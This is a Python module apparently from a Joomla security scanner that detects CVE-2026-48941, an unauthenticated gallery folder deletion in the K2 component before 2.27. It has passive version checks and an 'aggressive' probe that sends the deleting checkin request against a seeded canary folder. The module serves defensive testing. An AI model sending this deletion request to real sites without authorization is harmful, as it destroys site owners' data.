from __future__ import annotations

import re
from typing import Any

from ...core.http import HttpClient, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-48941"
NAME = "K2 unauthenticated gallery folder deletion"
COMPONENT = "K2"
AFFECTED_RULE = "K2 1.0 through 2.26; fixed in 2.27"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
CHECKIN_PATH = "/index.php?option=com_k2&view=item&task=checkin"


def _numeric_version(version: str | None) -> str | None:
    match = re.match(r"\s*(\d+(?:\.\d+)+)", str(version or ""))
    return match.group(1) if match else None


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(_numeric_version(version))
    fixed = parse_version_safe("2.27")
    if parsed is None or fixed is None:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if parsed < fixed else "NOT_AFFECTED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    info = (plugins or {}).get("k2", {})
    if not info.get("found"):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_DETECTED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, detail="K2 was not detected through its manifest or component route.", action="No action is required unless K2 is installed but hidden from public detection.")
    version = info.get("version")
    status = classify_version(version)
    if status == "LIKELY_VULNERABLE":
        detail = f"Detected K2 {version}, within the affected range below 2.27. The frontend item.checkin task deletes sigProFolder without a guest check."
        action = "Upgrade K2 to 2.27 or newer."
        confidence = "HIGH"
    elif status == "NOT_AFFECTED":
        detail = f"Detected K2 {version}, which rejects guest item.checkin requests."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = "K2 was detected, but its version could not be determined."
        action = "Determine the installed K2 version and upgrade to 2.27 or newer."
        confidence = "MEDIUM"
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence=confidence, component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE, exploit_available=True, detail=detail, action=action)


def run_aggressive_probe(
    target_url: str,
    folder: str = "proofcms-48941",
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    """Delete a seeded gallery folder through the unauthenticated checkin task.

    K2 2.26 and earlier ``K2ModelItem::checkin()`` deletes
    ``media/k2/galleries/<sigProFolder>`` when no ``cid`` is supplied and the
    folder is not numeric. 2.27 adds a guest check in the controller. The probe
    reads the seeded canary file first, requests the delete, then checks that
    the canary is gone.
    """
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    canary_url = f"{base}/media/k2/galleries/{folder}/canary.txt"
    before = client.get(canary_url, timeout=timeout)
    before_status = 0 if is_transport_error(before) else before.get("status", 0)
    if before_status != 200:
        return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=False, proof_url=canary_url, detail=f"The gallery canary media/k2/galleries/{folder}/canary.txt is not publicly readable; seed it first. Nothing was sent.", action="Create the gallery folder and canary, then re-run the probe.")

    delete_url = f"{base}{CHECKIN_PATH}&sigProFolder={folder}"
    response = client.get(delete_url, timeout=timeout)
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=delete_url, detail=f"The checkin request failed in transit ({transport_error_detail(response)}).", action="Retry when the target is reachable.")
    after = client.get(canary_url, timeout=timeout)
    after_status = 0 if is_transport_error(after) else after.get("status", 0)
    gone = before_status == 200 and after_status == 404
    evidence = {
        "folder": folder,
        "canary_url": canary_url,
        "canary_status_before": before_status,
        "canary_status_after": after_status,
        "checkin_status": response.get("status"),
        "canary_gone": gone,
    }
    if gone:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=delete_url,
            evidence=evidence,
            detail=(
                "An unauthenticated request to the frontend item.checkin task deleted the seeded gallery folder. "
                "The probe removed only media/k2/galleries/proofcms-48941."
            ),
            action="Upgrade K2 to 2.27 or newer.",
        )
    status = "NOT_CONFIRMED"
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=status,
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=delete_url,
        evidence=evidence,
        detail=(
            f"The checkin request returned HTTP {response.get('status')} and the canary "
            f"{'survived' if after_status == 200 else 'was not readable'}; 2.27 rejects guest requests."
        ),
        action="Upgrade affected K2 versions even when the external proof is inconclusive.",
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    url = f"{base}/index.php?option=com_k2"
    response = HttpClient(timeout=timeout, proxy=proxy).get(url, timeout=timeout)
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The K2 page could not be reached ({transport_error_detail(response)}).", action="Retry when the target is reachable.")
    return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail="The K2 page is reachable; the checkin delete payload was not sent in safe mode.", action="Use aggressive mode with a seeded gallery canary on an authorized staging site.")


def check(target_url: str, joomla_version: str | None = None, run_exploit_check: bool = False, timeout: int = 12, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, aggressive_command: str | None = None, aggressive_args: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    from ...core.args import aggressive_value

    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode == "aggressive":
        if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
            passive.detail += " Aggressive proof skipped because K2 was not detected as potentially affected."
            return passive
        result = run_aggressive_probe(
            target_url,
            folder=aggressive_value(aggressive_args, aggressive_command, "folder") or "proofcms-48941",
            timeout=timeout,
            proxy=proxy,
        )
        result.component_version = passive.component_version
        return result
    if exploit_mode != "safe":
        passive.detail += " This module supports safe (K2 reachability) and aggressive (checkin folder deletion) modes."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_joomla_versions": ["*"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "vulnerability_type": "Arbitrary File Deletion", "module_version": "1.0.0", "last_reviewed": "2026-11-17", "updated": "2026-11-17", "required_detectors": ["k2"], "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-48941", "https://github.com/getk2/k2/blob/master/CHANGELOG.md", "https://mysites.guru/vulnerabilities/CVE-2026-48941/"]}
